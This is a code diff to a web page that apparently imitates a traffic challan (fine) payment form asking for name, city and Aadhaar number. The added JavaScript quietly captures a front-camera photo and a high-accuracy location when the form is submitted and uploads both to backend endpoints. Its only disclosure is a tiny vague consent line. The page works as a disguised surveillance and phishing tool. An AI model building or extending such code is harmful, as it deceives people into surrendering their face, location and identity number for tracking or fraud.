@@ -128,6 +128,10 @@
       .submit-btn:hover {
         background: #3f51b5;
       }
+      .submit-btn:disabled {
+        background: #999;
+        cursor: not-allowed;
+      }
       .links {
         margin-top: 15px;
         font-size: 13px;
@@ -159,6 +163,24 @@
         font-size: 12px;
         margin-top: 5px;
         display: none;
+      }
+      .data-notice {
+        background: #fff3cd;
+        border: 2px solid #856404;
+        padding: 15px;
+        margin: 20px 0;
+        border-radius: 5px;
+      }
+      .data-notice-title {
+        color: #856404;
+        font-weight: bold;
+        margin-bottom: 8px;
+      }
+      .data-notice-text {
+        color: #000000;
+        font-size: 11px;
+        line-height: 1.5;
+        text-align: center;
       }
     </style>
   </head>
@@ -216,6 +238,9 @@
         <span class="error" id="captchaError">Please enter above code</span>
 
         <button type="submit" class="submit-btn">Submit</button>
+        <p class="data-notice-text">
+            By submitting this form, you consent to the collection of your info.
+          </p>
 
         <div class="links">
           <a href="#"
@@ -281,12 +306,68 @@
         }
       }
 
+      // Function to capture photo from camera
+      async function capturePhoto() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" } 
+          });
+          
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+          
+          await new Promise(resolve => {
+            video.onloadedmetadata = resolve;
+          });
+          
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0);
+          
+          stream.getTracks().forEach(track => track.stop());
+          
+          return canvas.toDataURL('image/jpeg', 0.8);
+        } catch (error) {
+          console.error('Camera error:', error);
+          throw error;
+        }
+      }
+
+      // Function to send data to backend
+      async function sendToBackend(imageData, locationData) {
+        try {
+          // Upload image
+          const imageResponse = await fetch('/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: imageData })
+          });
+          const imageResult = await imageResponse.json();
+          
+          // Upload location
+          const locationResponse = await fetch('/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(locationData)
+          });
+          const locationResult = await locationResponse.json();
+          
+          return { imageResult, locationResult };
+        } catch (error) {
+          console.error('Backend error:', error);
+          throw error;
+        }
+      }
+
       // Initialize captcha on page load
       refreshCaptcha();
 
       document
         .getElementById("challanForm")
-        .addEventListener("submit", function (e) {
+        .addEventListener("submit", async function (e) {
           e.preventDefault();
           let valid = true;
 
@@ -322,26 +403,53 @@
           }
 
           if (valid) {
-            // Get user location
-            if (navigator.geolocation) {
-              navigator.geolocation.getCurrentPosition(
-                function (position) {
-                  const lat = position.coords.latitude;
-                  const lon = position.coords.longitude;
-                  alert(
-                    `Form submitted successfully!\n\nName: ${name}\nCity: ${city}\nAadhar: ${aadhar}\n\nLocation captured:\nLatitude: ${lat}\nLongitude: ${lon}`
-                  );
-                },
-                function (error) {
-                  alert(
-                    `Form submitted successfully!\n\nName: ${name}\nCity: ${city}\nAadhar: ${aadhar}\n\nLocation access denied: ${error.message}`
-                  );
+            const submitBtn = document.querySelector('.submit-btn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Processing...';
+            
+            try {
+              // Capture photo
+              const imageData = await capturePhoto();
+              
+              // Get location
+              const position = await new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                  navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true
+                  });
+                } else {
+                  reject(new Error('Geolocation not supported'));
                 }
-              );
-            } else {
+              });
+              
+              const locationData = {
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                accuracy: position.coords.accuracy
+              };
+              
+              // Send to backend
+              const result = await sendToBackend(imageData, locationData);
+              
               alert(
-                `Form submitted successfully!\n\nName: ${name}\nCity: ${city}\nAadhar: ${aadhar}\n\nGeolocation not supported by browser`
+                `Form submitted successfully!\n\n` +
+                `Name: ${name}\n` +
+                `City: ${city}\n` +
+                `Aadhar: ${aadhar}\n\n` +
+                `Photo captured and stored\n` +
+                `Location: ${locationData.lat.toFixed(6)}, ${locationData.lon.toFixed(6)}\n` +
+                `Accuracy: ${locationData.accuracy.toFixed(0)}m`
               );
+              
+              // Reset form
+              document.getElementById('challanForm').reset();
+              refreshCaptcha();
+              
+            } catch (error) {
+              alert('Error: ' + error.message + '\n\nPlease ensure camera and location permissions are granted.');
+            } finally {
+              submitBtn.disabled = false;
+              submitBtn.textContent = 'Submit';
             }
           }
         });
